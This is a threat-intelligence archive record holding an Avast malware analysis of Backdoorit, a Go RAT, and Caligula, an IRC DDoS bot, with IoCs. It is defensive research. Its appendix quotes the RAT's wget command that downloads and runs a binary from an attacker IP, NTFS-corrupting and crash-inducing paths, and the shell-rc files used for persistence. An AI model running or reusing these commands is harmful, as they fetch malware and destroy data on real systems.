{
    "id": "2038c711-381d-4412-818c-3611e49bfc91",
    "created_at": "2023-01-12T14:59:39.48783Z",
    "updated_at": "2025-03-27T02:09:29.424792Z",
    "deleted_at": null,
    "sha1_hash": "1840854a8b7726a9cf88b5f141eb0de509291180",
    "title": "2022-07-13 - Go malware on the rise",
    "authors": "",
    "file_creation_date": "2022-07-18T18:27:06Z",
    "file_modification_date": "2022-07-18T18:27:06Z",
    "file_size": 667795,
    "plain_text": "# Go malware on the rise\n\n**decoded.avast.io/davidalvarez/go-malware-on-the-rise/**\n\nby [David ÁlvarezJuly 13, 202210 min read](https://decoded.avast.io/author/davidalvarez/)\n\n## Introduction\n\n\nJuly 13, 2022\n\n\nThe Go programming language is becoming more and more popular. One of the reasons\nbeing that Go programs can be compiled for multiple operating systems and architectures in\na single binary self containing all needed dependencies. Based on these properties, and as\n[we expected, we observed an increase in the number of malware and gray tools written in](https://decoded.avast.io/janneduchal/analysis-of-attack-against-national-games-of-china-systems/)\nGo programming language in the last months. We are discovering new samples weekly.\n\nFor instance, in `late April, we discovered two new strains in our internal honeypots,`\nnamely `Backdoorit and` `Caligula, both of which were at that time undetected on VT.`\n\n[Backdoorit VirusTotal history](https://www.virustotal.com/gui/file/34366a8dab6672a6a93a56af7e27722adc9581a7066f9385cd8fd0feae64d4b0)\n\n\n-----\n\n[Caligula VirusTotal history](https://www.virustotal.com/gui/file/fe7369b6caf4fc755cad2b515d66caa99ff222c893a2ee8c8e565121945d7a9c)\n\nBoth of these malware strains are multiplatform bots compiled for many different processor\narchitectures and written in the Go programming language.\n\n## Analyzing Backdoorit\n```\nBackdoorit (version 1.1.51562578125) is a multiplatform RAT written in Go\n\n```\nprogramming language and supporting both `Windows and` `Linux/Unix operating`\nsystems. In many places in the code it’s also referred to as `backd00rit .`\n\nBased on the close inspection of the `analyse-full command of` `Backdoorit, we`\nconcluded that the main purpose of this malware is stealing `Minecraft related files,`\n```\nVisual Studio and Intellij projects.\n\n```\n\n-----\n\nBut the malware is not limited just to those files. Some commands ( upload,\n```\nbasharchive, bashupload and so on) allow it to steal arbitrary files and information,\n\n```\ninstall other malware in the system or run arbitrary commands ( run, `run-binary, etc.)`\nand take screenshots of the user activity ( screenshot, `ssfile and so on).`\n\nEvidence indicates that the `Backdoorit developer is not a native English speaker, further`\npointing to a possible Russian threat actor. The comments and strings in the code are\nmostly written in English but often grammatically incorrect. For instance, we found the\nmessage: “An confirmation required, run ”. We also discovered some isolated strings written\nin the Russian language.\n\nIn addition to the aforementioned strings we also observed that, amongst others, the\n[VimeWorld files (a Russian project that offers Minecraft servers) are being targeted. This](https://vimeworld.com/)\nfurther leads us to believe the Russian origin of the threat actor behind this malware.\n\nAfter running `Backdoorit the` `RAT retrieves some basic environment information such`\nas the current operating system and the name of the user. It then continuously tries to\nconnect to a `C&C server to give the attacker access to a shell.`\n\nThe malware logs all executed operations and taken steps via a set of\n\n`backd00r1t_logging_*` functions. Those logs can be uploaded to the server of the\nattacker either by using `uploadlogs and uploadlogs-file shell commands or`\nautomatically in case a Go panic exception is raised.\n\nIn such case `backd00r1t_backdoor_handlePanic handles the exception and performs`\nthe following actions:\n\n1. It first sends the logs to the endpoint `/api/logs of the` `C&C server with a` `JSON`\n\nrequest structure as defined in the function: `backd00r1t_api_SendLogs .`\n2. It closes the connection with the C&C server.\n3. It attempts to reconnect again.\n\nThe mentioned handler helps to keep the bot connected and also allows the attacker to\nremotely follow the execution trace.\n\nOnce the connection to C&C succeeds, the attacker gets the context information listed\nbelow. The function `backd00r1t_backdoor_SocketConnectionHandle is responsible for`\nhandling all the commands supported by this RAT and first calls to\n```\nbackd00r1t_backdoor_printMotd for displaying such information:\n\n```\n\n-----\n\nLast connected time\nThe Backdoorit version\nProcess\nActive connections\nUser name\nUser home\nUser id\nLogin\nGid\nProcess path\nModules Autostart state\n\nThe shell allows the threat actor to remotely execute arbitrary commands. The first\ncommand that is likely to be run is the `analyse-full` command because it generates a\n```\nreport.txt file containing the Desktop, Documents, Downloads, Minecraft and\nVimeWorld folder file trees and uploads the mentioned report and both Visual Studio\n\n```\nand `IntelliJ projects folders contents, to Bashupload, a web service allowing to upload`\nfiles from command line with a storage limitation of `50GB .`\n\nAs mentioned earlier, if the attacker chooses to do so, he/she will be also able to implant\nother malware in the system. The threat actor can use the commands: `run-binary (a`\ncommand for downloading and executing a script), `shell (a command allowing to spawn`\nthe operating system shell and execute arbitrary commands) or other available commands.\n\nThe malware also contains a sort of a “ kill-switch ” that can be triggered by the\n```\nexploit command, but in this case this does not simply remove the malware itself, but\n\n```\n[has the ability to crash the Windows operating system by exploiting CVE-2021-24098 and](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-24098)\n[also corrupt the NTFS of the hard disk via CVE-2021-28312 on vulnerable systems. This](https://twitter.com/jonasLyk/status/1347901108132454406)\nleads to complete loss of file information (including size, time and date stamps, permissions\nand data content) as well as, of course, removing evidence of the infection.\n\nThere are many more commands implemented in the shell that you can check at the\ncorresponding section of the Appendix. As you will notice, the malware incorporates a\n```\ncheckupdates command so we may expect to see new versions of Backdoorit soon.\n\n## Analyzing Caligula\nCaligula is a new IRC multiplatform malicious bot that allows to perform DDoS\n\n```\nattacks.\n\nThe malware was written in Go programming language and distributed in `ELF files`\ntargeting several different processor architectures:\n\n\n-----\n\nIntel 80386 32-bit\nARM 32-bit\nPowerPC 64-bit\nAMD 64-bit\n\nIt currently supports `Linux and` `Windows platforms via` `WSL and uses the`\nfunction os_user_Current for determining the underlying operating system.\n\n`Caligula is based on the` _[Hellabot open source project, an easily modifiable event based](https://github.com/whyrusleeping/hellabot)_\n```\nIRC bot with the ability to be updated without losing connection to the server.\n\n```\nOf course, more code reuse was found in the `Caligula coming from open source`\n[projects (log15,](https://github.com/inconshreveable/log15) _[fd,](https://github.com/ftrvxmtrx/fd)_ _[go-shellwords,](https://github.com/mattn/go-shellwords)_ _[go-isatty and](https://github.com/mattn/go-isatty)_ _[go-colorable) but the core functionality is](https://github.com/mattn/go-colorable)_\nbased on `Hellabot .`\n\nAll the samples that we hunted in the wild are prepared to connect to the same hardcoded\nIRC channel by using the following data:\n\nHost: 45.95.55.24:6667\nChannel: #caligula\nUsername: It is composed of the platform, current user and a pseudo-random number.\n\ne.g. [LINUX]kali-11066\n\nAs shown in the following screenshot, the bot is prepared for joining the `Caligula IRC`\n```\nNet v1.0.0 botnet.\nCaligula IRC Net v1.0.0 is a botnet ready for flooding. The bots offers to the attacker\n\n```\nthe following attacks:\n\nAttack Description\n\nudp udp flood with limited options.\n\nhttp http flood with no options at all.\n\n\n-----\n\nsyn syn flood.\n\nhandshake handshake flood.\n\ntcp tcp flood.\n\nFor more information on how Caligula bot source code is organized, check the source code\nfile listing available in the appendix. It can be useful for getting a high level perspective on\nthe malware design, notice that new attack methods can be easily added to it and identify\nthe Caligula malware family.\n\n## Conclusion\n\nDue to its native multiplatform support and relative ease of development, the use of Go\nprogramming language for malicious purposes is currently growing, especially in malware\ntargeting Unix/Linux operating systems.\n\nNaturally with the growing interest and community around the Go programming language,\nsome of the malicious tools are being open sourced on Github and resued by different\nthreat actors.\n\nIn this instance, we were one of the firsts in hunting and detecting Backdoorit and Caligula.\n\n## Appendix\n\n Backdoorit shell commands reference\n\n\nCommand\nsyntax\n\n\nDescription\n\n\nshell This command spawns a shell. For Windows platforms, if available, it\nexecutes Powershell. Otherwise it executes the Command prompt. For the\nrest of the platforms, it spawns a Bash Unix shell.\n\nhelp Shows the help containing the available commands but also some status\ninformation.\n\ntoggle-path Enables or disables showing the toggle path.\n\nbell Enables or disables the bell sound.\n\nclear-fallback Clears the screen.\n\n\nbackgroundlogs\n\n\nAsks to the attacker for the buffer size and the maximum buffer size in\norder to store the logs in background.\n\n\n-----\n\nbackdoor Shows the RAT information: BuiltCodenameVersionReconnect time\n\nclear-code Resets any style property of the font by using the ANSI Escape Codes :\n_\\x1B[0J_\n\nclear-color Clears the shell coloring.\n\ncolors / color Enables or Disables the shell coloring.\n\n\nun-export\n\n[env][fir][key]\n\n[url]\n\n\nRemoves an environment variable.\n\n\nexport Adds an environment variable.\n\nmkdir [path] Creates a folder for the specified path.\n\nexit Exits.\n\nwcd Prints the working directory.\n\nmotd Prints the following information: Last connected time. The Backdoorit\nversion. ProcessActiveConnectionsUser nameUser homeUser\nidLoginGidProcess path The modules Autostart state.\n\n\nget-asset\n\n[asset]\n\nextract-asset\n\n[asset] (path)\n\n\nAccess to an asset (those are identified by string and accessed via GO\nlanguage mapaccess1_faststr function)\n\nExtracts an asset to the specified path.\n\n\nsafe Allows to disable safe mode\n\nopen-file Open file.\n\nopen Open url in browser.\n\n\nlist-windowsdisks\n\ncp [target]\n\n[dist]\n\n\nList disks (command available for Windows systems)\n\nCopy file.\n\n\nrm Removes a file or a folder and all its content.\n\nIf the attacker is trying to remove the entire current folder, the agent asks\nher/him for preventing the human error.\n\ncd Changes the working directory.\n\nls It shows the modification date, Filename and Size.\n\ncat [file][path] Read file.\n\n\n-----\n\ncheckupdates It asks for the version to the endpoint: /api/version\n\nIf there is a new version available for the appropriate operating system,\nthen it downloads it by using wget:\n\n_wget -O app –user nnstd –password access_\n_http://185.174.136.162/4ejski_bejenec && chmod +x app && ((./app) &)_\n\n\nexploit\n\n[exploit] […\nargs]\n\n\nRuns an exploit. It currently supports the following exploits:\nwindows/crash/uncIt crashes Windows by accessing the file:\n\n_\\\\.\\globalroot\\device\\condrv\\kernelconnectwindows/destroy/i30It corrupts_\nthe drive by executing the following command: cd C:\\\\:$i30:$bitmap\n\n\nautostart It persists the payload by modifying the following files: .bashrc _.profile_\n_.zshrc_ _.bash_profile_ _.config/fish/config.fish This command enables the_\ninternal flag: backd00r1t_modules_autostart_state\n\n\nautostartupdate\n\nexec [cmd] […\nargs]\n\nsysinfo\n{detailed}\n\nneofetch /\nscreenfetch\n\nScreenshot /\nssfile / screen\n\n\nUpdate autostart.\n\nExecutes a command with the specified arguments.\n\nShows the following system information:\n\nWorkingDirectory, Command line, User, Terminal\n\nShows the following system information: CPU Info: Family, Vendor,\nPhysicalID. CoresHost InfoUptime, OS, Platform, Platform Family, Platform\nVersion, Host ID, Kernel Arch, Kernel Version, Network Interfaces Info: HW\nAddr, Flags, Index\n\nIt creates a screenshot, and stores it in a PNG file located in one of the\nfollowing directories. It depends on the platform: Windows: C:\\Users\\\n_{username}\\AppData\\Local\\Temp Linux: /tmp/ Finally, the screenshot is_\nuploaded and, after that, it removes the file from disk.\n\n\narchiveapi It creates a file following the format:\n\n_tmp-archive-{current_date}.gdfgdgd For Windows platforms: C:\\\\Users\\\\_\n_{username}\\\\AppData\\\\Local\\\\Temp For Linux platforms: /tmp/ The function_\nremoves the previous file in case a file with the same name does exist.\nThen it sends the file and after that, removes the file\n\n\nCreatearchive\n\n[output]\n\n[target]\n\nUploadapi\n\n[file][path]\n\n\nCreate archive with files from target in output.\n\nAutomatically uploads the file specified to predefined servers.\n\n\nuploadlogs-file Uses the /api/upload API endpoint for uploading the file agent.log\n\nuploadlogs It sends the logs to the API endpoint /api/logs in JSON format.\n\n\n-----\n\nupload [url]\n\n[file]\n\nbashupload\n\n[file][path]\n\n\nUpload file to Server (HTTP).\n\nAutomatically upload file to https://bashupload.com/\n\n\nbashdownload Access the file in https://bashupload.com/ with the parameter: ?\n_download=1_\n\n\nbashuploadparse [file]\n\n[path]\n\nbasharchive\n\n[target]\n\n\nAutomatically upload file to https://bashupload.com/ and get direct link\n\nCreate archive and upload it to bashupload.com:\n\nhttps://bashupload.com/backdoor-archive.zip\n\n\ndownload Downloads a file.\n\n\nbashdownload\n\n[url]\n\n\nDownloads the file by querying the url: https://bashupload.com/\n\nWith the parameter: ?download=1\n\n\nrun [url] Download script and run it.\n\nrun-binary Download script, and run it. Currently, it only supports Windows platforms.\nIt downloads the run-script.ps1 file to a temporary folder and executes it.\n\ncls Clear screen.\n\n$STOP This command stops Backdoorit.\n\nanalyse-full It creates a report report.txt containing:\n_{USERHOME}\\source\\repos{USERHOME}\\IdeaProjectsDesktop file tree_\n_Documents file tree Downloads file tree AppData\\Roaming\\.minecraft file_\ntree AppData\\Roaming\\.vimeworld file tree. It uploads the files in Visual\n_Studio repos folder and IntelliJ projects folder via_\n_backd00r1t_analyze_uploadDirectorybut also a report of the files in the_\nmain computer folders via backd00r1t_analyze_uploadFile\n\n## Backdoorit bot source code listing\n\nH:/backdoorIt//injected/backdoor/BackdoorEnvironment.go\nH:/backdoorIt//injected/backdoor/BackgroundTasks.go\nH:/backdoorIt//injected/backdoor/CommandHelpers.go\nH:/backdoorIt//injected/backdoor/ConnectionHandler.go\nH:/backdoorIt//injected/files/Assets.go\nH:/backdoorIt//injected/api/Configuration.go\nH:/backdoorIt//injected/backdoor/ExecHandlers.go\nH:/backdoorIt//injected/backdoor/ExecHandlers__linux.go\nH:/backdoorIt//injected/backdoor/main.go\n\n\n-----\n\nH:/backdoorIt//injected/launcher/main.go\n\n## Caligula bot source code listing\n\n/root/irc/bot/attack/attack.go\n/root/irc/bot/attack/methods.go\n/root/irc/bot/attack/parser.go\n/root/irc/bot/attack/flags.go\n/root/irc/bot/network/header.go\n/root/irc/bot/network/ip.go\n/root/irc/bot/network/tcp.go\n/root/irc/bot/routine/timedRoutine.go\n/root/irc/bot/attack/methods/httpflood.go\n/root/irc/bot/attack/methods/sshflood.go\n/root/irc/bot/attack/methods/synflood.go\n/root/irc/bot/attack/methods/tcpflood.go\n/root/irc/bot/attack/methods/udpflood.go\n/root/irc/bot/handle.go\n/root/irc/bot/singleInstance/singleinstance.go\n/root/irc/bot.go\n\n## IoCs\n\n Backdoorit\n\n```\n34366a8dab6672a6a93a56af7e27722adc9581a7066f9385cd8fd0feae64d4b0\n\n```\n\n## Caligula\n```\n   147aac7a9e7acfd91edc7f09dc087d1cd3f19c4f4d236d9717a8ef43ab1fe6b6\n   1945fb3e2ed482c5233f11e67ad5a7590b6ad47d29c03fa53a06beb0d910a1a0\n   4a1bb0a3a83f56b85f5eece21e96c509282fec20abe2da1b6dd24409ec6d5c4d\n   6cfe724eb1b1ee1f89c433743a82d521a9de87ffce922099d5b033d5bfadf606\n   71b2c5a263131fcf15557785e7897539b5bbabcbe01f0af9e999b39aad616731\n   99d523668c1116904c2795e146b2c3be6ae9db67e076646059baa13eeb6e8e9b\n   fe7369b6caf4fc755cad2b515d66caa99ff222c893a2ee8c8e565121945d7a9c\n   97195b683fb1f6f9cfb6443fbedb666b4a74e17ca79bd5e66e5b4e75e609fd22\n   edcfdc1aa30a94f6e12ccf3e3d1be656e0ec216c1e852621bc11b1e216b9e001\n\n```\n[The complete Backdoorit and Caligula IoCs are in our IoC repository.](https://github.com/avast/ioc/tree/master/Caligula)\n\n[Tagged asanalysis,](https://decoded.avast.io/tag/analysis/) [golang,](https://decoded.avast.io/tag/golang/) [malware](https://decoded.avast.io/tag/malware/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-13 - Go malware on the rise.pdf"
    ],
    "report_names": [
        "2022-07-13 - Go malware on the rise.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535579,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1658168826,
    "ts_modification_date": 1658168826,
    "files": {
        "pdf": "https://archive.orkl.eu/1840854a8b7726a9cf88b5f141eb0de509291180.pdf",
        "text": "https://archive.orkl.eu/1840854a8b7726a9cf88b5f141eb0de509291180.txt",
        "img": "https://archive.orkl.eu/1840854a8b7726a9cf88b5f141eb0de509291180.jpg"
    }
}